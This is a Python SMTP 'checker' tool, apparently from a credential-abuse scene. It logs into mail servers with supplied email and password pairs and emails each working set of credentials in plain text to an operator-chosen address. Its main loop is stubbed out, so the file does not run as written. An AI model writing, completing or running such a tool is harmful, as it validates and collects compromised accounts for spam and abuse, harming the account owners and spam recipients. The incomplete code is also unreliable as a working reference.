import smtplib
import time
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from colorama import init, Fore
import os
init(autoreset=True)

def afficher_interface_ascii():
    ascii_art = '\n      ██████╗██╗  ██╗███████╗ ██████╗██╗  ██╗███████╗██████╗     ███████╗███╗   ███╗████████╗██████╗ \n     ██╔════╝██║  ██║██╔════╝██╔════╝██║ ██╔╝██╔════╝██╔══██╗    ██╔════╝████╗ ████║╚══██╔══╝██╔══██╗\n     ██║     ███████║█████╗  ██║     █████╔╝ █████╗  ██████╔╝    ███████╗██╔████╔██║   ██║   ██████╔╝\n     ██║     ██╔══██║██╔══╝  ██║     ██╔═██╗ ██╔══╝  ██╔══██╗    ╚════██║██║╚██╔╝██║   ██║   ██╔═══╝ \n     ╚██████╗██║  ██║███████╗╚██████╗██║  ██╗███████╗██║  ██║    ███████║██║ ╚═╝ ██║   ██║   ██║     \n      ╚═════╝╚═╝  ╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝    ╚══════╝╚═╝     ╚═╝   ╚═╝   ╚═╝     \n                                                                                                                                               \n                                [ √ ] by @tokyohq / https://t.me/arkenahousee\n                                [ √ ] v2.0 - Checker SMTP Rez Email ! \n    '
    print(Fore.RED + ascii_art)

def envoyer_email(smtp_server, port, email, password, recipient_email):
    try:
        server = smtplib.SMTP(smtp_server, port, timeout=10)
        server.starttls()
        server.login(email, password)
        msg = MIMEMultipart()
        msg['From'] = email
        msg['To'] = recipient_email
        msg['Subject'] = 'DRING DRING !'
        html = f'\n        <html>\n        <head></head>\n        <body>\n            <h1>by @tokyohq</h1>\n            <p>Copy : </p>\n            <p>{smtp_server}|{port}|{email}|{password}</p>\n        </body>\n        </html>\n        '
        msg.attach(MIMEText(html, 'html'))
        server.sendmail(email, recipient_email, msg.as_string())
        server.quit()
        print(Fore.GREEN + f'[ √ ] Send successfully {recipient_email} via {smtp_server}.')
    except Exception as e:
        print(Fore.RED + f'[ x ] Error send {smtp_server}: {str(e)}')

def verifier_smtp_et_envoyer_email(smtp_file, delay, recipient_email):
    if not os.path.exists(smtp_file):
        print(Fore.RED + '[ x ] Your file does not exist.')
    return

def interface():
    afficher_interface_ascii()
    smtp_file = input('[ √ ] Enter your files (ex: smtps.txt) : ')
    delay = input('[ √ ] Enter times enter 2 connect (ex: 2) : ')
    recipient_email = input('[ √ ] Enter your email for recevied (Use yahoo for best result) : ')
    try:
        delay = int(delay)
        if delay < 0:
            raise ValueError('[ x ] This delay is not valid')
    except ValueError:
        print(Fore.RED + '[ x ] This delay is not valid.')
        return None

def quitter():
    input(Fore.RED + '\nEnter for exit.')
    exit()
if __name__ == '__main__':
    try:
        interface()
    except KeyboardInterrupt:
        print(Fore.RED + '\nStop by user.')
        quitter()
